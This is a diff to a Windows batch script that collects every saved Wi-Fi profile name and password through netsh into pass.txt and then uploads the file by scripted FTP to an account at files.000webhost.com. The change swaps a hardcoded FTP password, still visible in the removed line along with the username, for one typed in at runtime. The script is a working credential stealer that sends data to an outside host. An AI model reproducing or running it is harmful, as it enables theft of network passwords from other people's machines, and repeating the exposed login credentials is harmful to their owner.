@@ -8,10 +8,10 @@ for /F "tokens=2 delims=:" %%a in ('netsh wlan show profile') do (
     )
     echo %%a : !wifi_pwd!>>pass.txt
 )
-
+set /p pass=pass
 echo open files.000webhost.com>transfer.txt
 echo nigatoni>>transfer.txt
-echo Nunnulife@123>>transfer.txt
+echo %pass%>>transfer.txt
 echo put pass.txt >>transfer.txt
 echo bye>>transfer.txt
 ftp -s:transfer.txt
